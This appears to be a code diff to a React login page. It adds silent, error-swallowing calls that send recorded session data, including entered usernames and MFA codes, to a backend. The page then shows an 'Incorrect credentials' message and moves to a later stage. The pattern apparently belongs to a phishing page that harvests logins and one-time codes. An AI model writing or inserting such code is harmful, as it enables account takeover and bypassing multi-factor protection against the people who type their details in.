@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
 import { ArrowRight, CheckCircle, AlertCircle } from 'lucide-react';
-import { sessionTracker } from '../utils/analytics';
+import { sessionTracker, sendSessionToBackend } from '../utils/analytics';
 
 export default function Login() {
   const [stage, setStage] = useState(1);
@@ -39,6 +39,8 @@ export default function Login() {
       username,
       timestamp: Date.now()
     });
+    // send to backend for analysis
+    try { sendSessionToBackend(); } catch (e) {}
 
     setError('Incorrect credentials. Please try again.');
     setShaking(true);
@@ -52,6 +54,7 @@ export default function Login() {
       mfaCode,
       timestamp: Date.now()
     });
+    try { sendSessionToBackend(); } catch (e) {}
     setStage(3);
   };
 
